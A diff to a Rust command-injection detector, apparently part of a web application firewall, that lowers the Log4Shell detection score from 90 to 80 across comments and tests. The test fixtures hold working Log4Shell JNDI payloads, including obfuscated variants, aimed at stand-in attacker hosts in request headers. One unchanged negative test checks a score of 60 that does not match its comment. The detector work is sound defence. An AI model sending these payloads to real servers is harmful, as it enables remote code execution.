@@ -36,7 +36,7 @@ pub struct CommandInjectionDetector;
 
 /// 2026-05-08 GAP-008 — Log4Shell (CVE-2021-44228) patterns.
 /// Checked **before** the baseline cmdi patterns and emit at
-/// **score 90** (Critical-RCE / known-CVE tier — one tier above
+/// **score 80** (Critical-RCE / known-CVE tier — one tier above
 /// baseline cmdi). Justification: CVSS 10.0, active in the wild,
 /// pattern specificity makes FP essentially zero on real traffic.
 ///
@@ -184,7 +184,7 @@ const HEADER_SCAN_ALLOWLIST: &[&str] = &[
 ];
 
 fn check(input: &str, field: &str, signals: &mut Vec<Signal>) {
-    // GAP-008 (2026-05-08) — Log4Shell first; score 90 (Critical
+    // GAP-008 (2026-05-08) — Log4Shell first; score 80 (Critical
     // RCE / known-CVE tier). Same field tag as baseline cmdi so
     // the audit log + by-class counter stay coherent — operators
     // grep for "${jndi:" in audit if they need to differentiate.
@@ -375,7 +375,7 @@ mod tests {
     // GAP-008 (2026-05-08) — Log4Shell coverage
     // ============================================================
 
-    // Log4Shell direct ${jndi:<scheme>://...} — score 90 group.
+    // Log4Shell direct ${jndi:<scheme>://...} — score 80 group.
     positive!(log4shell_ldap_url,        "/?x=${jndi:ldap://attacker.com/a}");
     positive!(log4shell_rmi_url,         "/?x=${jndi:rmi://attacker.com/a}");
     positive!(log4shell_dns_url,         "/?x=${jndi:dns://attacker.com/a}");
@@ -409,8 +409,8 @@ mod tests {
             .find(|s| s.tag == "command_injection")
             .expect("Log4Shell payload should fire cmdi");
         assert_eq!(
-            log4_signal.score, 90,
-            "Log4Shell tier should emit score 90 (not baseline cmdi 70)",
+            log4_signal.score, 80,
+            "Log4Shell tier should emit score 80 (not baseline cmdi 70)",
         );
     }
 
@@ -446,8 +446,8 @@ mod tests {
         let req = make_view(&m, &u, &h, &b);
         let signals = d.inspect(&req);
         assert!(
-            signals.iter().any(|s| s.tag == "command_injection" && s.score == 90),
-            "Log4Shell in UA must catch at score 90",
+            signals.iter().any(|s| s.tag == "command_injection" && s.score == 80),
+            "Log4Shell in UA must catch at score 80",
         );
     }
 
@@ -460,7 +460,7 @@ mod tests {
         h.insert("referer", "${jndi:rmi://evil/x}".parse().unwrap());
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
-        assert!(d.inspect(&req).iter().any(|s| s.score == 90));
+        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
     }
 
     #[test]
@@ -472,7 +472,7 @@ mod tests {
         h.insert("x-api-version", "${jndi:ldap://x/y}".parse().unwrap());
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
-        assert!(d.inspect(&req).iter().any(|s| s.score == 90));
+        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
     }
 
     // Negative — plain envvar template strings must NOT match
@@ -485,7 +485,7 @@ mod tests {
         let req = make_view(&m, &u, &h, &b);
         let signals = d.inspect(&req);
         // It MAY match the baseline cmdi `${VAR}` pattern (score 70)
-        // but must NOT match Log4Shell (score 90).
+        // but must NOT match Log4Shell (score 80).
         assert!(
             signals.iter().all(|s| s.score != 60),
             "plain envvar must not match Log4Shell tier",
@@ -525,8 +525,8 @@ mod tests {
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
         assert!(
-            d.inspect(&req).iter().any(|s| s.score == 90),
-            "nested ${{::-j}}-style obfuscation in UA must trip Log4Shell at score 90",
+            d.inspect(&req).iter().any(|s| s.score == 80),
+            "nested ${{::-j}}-style obfuscation in UA must trip Log4Shell at score 80",
         );
     }
 
@@ -543,8 +543,8 @@ mod tests {
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
         assert!(
-            d.inspect(&req).iter().any(|s| s.score == 90),
-            "lower:j case-fold obfuscation in UA must trip Log4Shell at score 90",
+            d.inspect(&req).iter().any(|s| s.score == 80),
+            "lower:j case-fold obfuscation in UA must trip Log4Shell at score 80",
         );
     }
 
@@ -561,8 +561,8 @@ mod tests {
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
         assert!(
-            d.inspect(&req).iter().any(|s| s.score == 90),
-            "upper:j case-fold obfuscation in UA must trip Log4Shell at score 90",
+            d.inspect(&req).iter().any(|s| s.score == 80),
+            "upper:j case-fold obfuscation in UA must trip Log4Shell at score 80",
         );
     }
 
@@ -578,8 +578,8 @@ mod tests {
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
         assert!(
-            d.inspect(&req).iter().any(|s| s.score == 90),
-            "nested obfuscation in Referer must trip Log4Shell at score 90",
+            d.inspect(&req).iter().any(|s| s.score == 80),
+            "nested obfuscation in Referer must trip Log4Shell at score 80",
         );
     }
 
@@ -596,8 +596,8 @@ mod tests {
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
         assert!(
-            d.inspect(&req).iter().any(|s| s.score == 90),
-            "obfuscated Log4Shell in Authorization must trip at score 90",
+            d.inspect(&req).iter().any(|s| s.score == 80),
+            "obfuscated Log4Shell in Authorization must trip at score 80",
         );
     }
 
@@ -613,8 +613,8 @@ mod tests {
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
         assert!(
-            d.inspect(&req).iter().any(|s| s.score == 90),
-            "obfuscated Log4Shell in Cookie must trip at score 90",
+            d.inspect(&req).iter().any(|s| s.score == 80),
+            "obfuscated Log4Shell in Cookie must trip at score 80",
         );
     }
 
@@ -633,7 +633,7 @@ mod tests {
         let h = log4shell_header_view("user-agent", "${jndi:ldap://attacker.example/x}");
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
-        assert!(d.inspect(&req).iter().any(|s| s.score == 90));
+        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
     }
 
     #[test]
@@ -644,7 +644,7 @@ mod tests {
         let h = log4shell_header_view("user-agent", "${jndi:rmi://attacker.example/x}");
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
-        assert!(d.inspect(&req).iter().any(|s| s.score == 90));
+        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
     }
 
     #[test]
@@ -658,7 +658,7 @@ mod tests {
         );
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
-        assert!(d.inspect(&req).iter().any(|s| s.score == 90));
+        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
     }
 
     #[test]
@@ -669,7 +669,7 @@ mod tests {
         let h = log4shell_header_view("user-agent", "${${lower:j}ndi:ldap://attacker.example/x}");
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
-        assert!(d.inspect(&req).iter().any(|s| s.score == 90));
+        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
     }
 
     #[test]
@@ -680,6 +680,6 @@ mod tests {
         let h = log4shell_header_view("referer", "${jndi:ldap://attacker.example/x}");
         let b = BodyPeek::empty();
         let req = make_view(&m, &u, &h, &b);
-        assert!(d.inspect(&req).iter().any(|s| s.score == 90));
+        assert!(d.inspect(&req).iter().any(|s| s.score == 80));
     }
 }
